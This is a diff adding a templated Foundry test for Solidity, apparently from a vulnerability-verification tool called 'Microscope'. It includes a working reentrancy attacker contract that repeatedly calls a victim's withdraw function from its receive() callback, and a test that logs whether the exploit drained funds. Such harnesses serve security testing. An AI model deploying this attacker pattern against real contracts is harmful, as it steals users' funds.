@@ -1,0 +1,65 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.24;
+
+import "forge-std/Test.sol";
+import "forge-std/console2.sol";
+import { {{ contract_name }} } from "../src/input.sol";
+
+contract MicroscopeReentrancyAttacker {
+    {{ contract_name }} private immutable victim;
+
+    constructor({{ contract_name }} target) payable {
+        victim = target;
+    }
+
+    function attack() external {
+        victim.{{ deposit_name }}{value: 1 ether}();
+        victim.{{ withdraw_name }}();
+    }
+
+    receive() external payable {
+        if (address(victim).balance >= 1 ether) {
+            victim.{{ withdraw_name }}();
+        }
+    }
+}
+
+contract MicroscopeAttackTest is Test {
+    address private constant VICTIM = address(0xB0B);
+
+    function test_microscope_attack() public {
+        {{ contract_name }} target = new {{ contract_name }}();
+        vm.deal(address(this), 1 ether);
+        vm.deal(VICTIM, 10 ether);
+        vm.prank(VICTIM);
+        target.{{ deposit_name }}{value: 10 ether}();
+
+        MicroscopeReentrancyAttacker attacker = new MicroscopeReentrancyAttacker{value: 1 ether}(target);
+        try attacker.attack() {} catch {}
+
+        uint256 attackerIn = 1 ether;
+        uint256 attackerOut = address(attacker).balance;
+        bool succeeded = attackerOut > attackerIn;
+        string memory result = string.concat(
+            "MICROSCOPE_RESULT {\"class\":\"reentrancy\",\"attacker_in\":\"",
+            _uintString(attackerIn), "\",\"attacker_out\":\"", _uintString(attackerOut),
+            "\",\"exploit_succeeded\":", succeeded ? "true" : "false",
+            ",\"steps\":[{\"victim_remaining\":\"", _uintString(address(target).balance), "\"}]}"
+        );
+        console2.log(result);
+    }
+
+    function _uintString(uint256 value) private pure returns (string memory) {
+        if (value == 0) return "0";
+        uint256 copy = value;
+        uint256 digits;
+        while (copy != 0) { digits++; copy /= 10; }
+        bytes memory buffer = new bytes(digits);
+        while (value != 0) {
+            digits--;
+            buffer[digits] = bytes1(uint8(48 + value % 10));
+            value /= 10;
+        }
+        return string(buffer);
+    }
+}
